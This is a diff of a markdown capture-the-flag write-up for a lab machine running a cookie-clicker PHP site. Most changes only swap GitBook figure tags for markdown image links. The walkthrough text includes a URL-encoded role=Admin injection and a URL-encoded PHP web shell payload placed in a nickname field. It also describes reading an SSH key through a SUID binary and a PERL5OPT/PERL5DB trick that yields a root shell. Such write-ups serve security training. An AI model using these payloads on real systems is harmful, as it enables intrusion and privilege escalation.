@@ -119,15 +119,15 @@ We probably need to do source code review later, but for now we can move on to e
 
 The website advertises a game:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+![](../../../.gitbook/assets/image.png)
 
 There are some reviews left behind by users in the Info tab:
 
-<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1).png>)
 
 We might need these usernames. First, let's register a user and login to see what this game is about. As it turns out, this is just a cookie clicker:
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2).png>)
 
 Based on the source code, there doesn't seem to be a subdomain or hidden directory (yet), so let's take a look at it to find vulnerabilities. `authenticate.php` handles the user sessions:
 
@@ -255,7 +255,7 @@ clicks=321&level=1&%72%6f%6c%65%3d%22%41%64%6d%69%6e%22%23
 
 After re-login, we see this:
 
-<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3).png>)
 
 We are now the administrators!
 
@@ -318,25 +318,23 @@ There's a lot of things going on here. In short, there are 3 parts to it:
 
 To abuse this, we can easily change our `nickname` to a PHP payload using the same exploit to get admin. The code doesn't check for the `nickname` parameter, so we only need to URL encode our PHP payload.
 
-{% code overflow="wrap" %}
 ```
 /save_game.php?clicks=321&level=1&nickname=%22%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%24%5f%52%45%51%55%45%53%54%5b%27%63%6d%64%27%5d%29%3b%20%3f%3e%22%23
 
 decoded, it gives nickname="<?php system($_REQUEST['cmd']); ?>"#
 ```
-{% endcode %}
 
 Afterwards, we can send a POST request with the `extension` parameter.
 
-<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(4).png>)
 
 From that `.php` file stored, check for RCE:
 
-<figure><img src="../../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(5).png>)
 
 Then, we can get a reverse shell:
 
-<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(6).png>)
 
 ## Privilege Escalation
 
@@ -378,20 +376,18 @@ Use the binary to execute the following task:
 
 The `execute_query` file is an ELF binary, and has SUID set for `jack`.
 
-{% code overflow="wrap" %}
 ```
 www-data@clicker:/opt/manage$ file execute_query 
 execute_query: setuid, setgid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cad57695aba64e8b4f4274878882ead34f2b2d57, for GNU/Linux 3.2.0, not stripped
 ```
-{% endcode %}
 
 I transferred it back to my machine for some reverse engineering via `ghidra`. When decompiled, we can see how there are `switch` cases within the `main` function:
 
-<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(7).png>)
 
 Firstly, I noticed that the `.sql` files DO NOT have absolute paths, meaning we could potentially do PATH hijacking. There's also some usage of the `system` function:
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(8).png>)
 
 Interesting. When run on the machine, it just shows this:
 
@@ -427,12 +423,10 @@ er -v < H
 
 The above can be converted to:
 
-{% code overflow="wrap" %}
 ```
 /home/jack/queries
 /usr/bin/mysql -u clicker_db_user --password='clicker_db_password' clicker -v < 
 ```
-{% endcode %}
 
 The above command was taking input from somewhere, and I assume it's a file. When taking another look at the `switch` statements, I noticed that there was a `default` case, which basically controlled `pcVar3`, the same variable contains filenames from the other `switch` cases.
 
@@ -446,11 +440,11 @@ ERROR: Can't initialize batch_readline - may be the input source is a directory 
 
 This worked! I tried reading the `id_rsa` file (since we are in `/home/jack/queries`) and it worked as well:
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(10).png>)
 
 Using the above, we can `ssh` in as `jack`:
 
-<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(11).png>)
 
 ### Sudo Privileges -> Root
 
@@ -496,10 +490,10 @@ There's no PATH hijacking for this binary, and the script uses `unset` on some P
 
 Based on the above, setting `PERL5OPT=-d` and `PERL5DB=system("sh");exit;`, we can get a `root` shell. I tried it in the machine, and it worked!
 
-<figure><img src="../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(12).png>)
 
 Now, we can easily get a `root` shell:
 
-<figure><img src="../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(13).png>)
 
 Rooted!
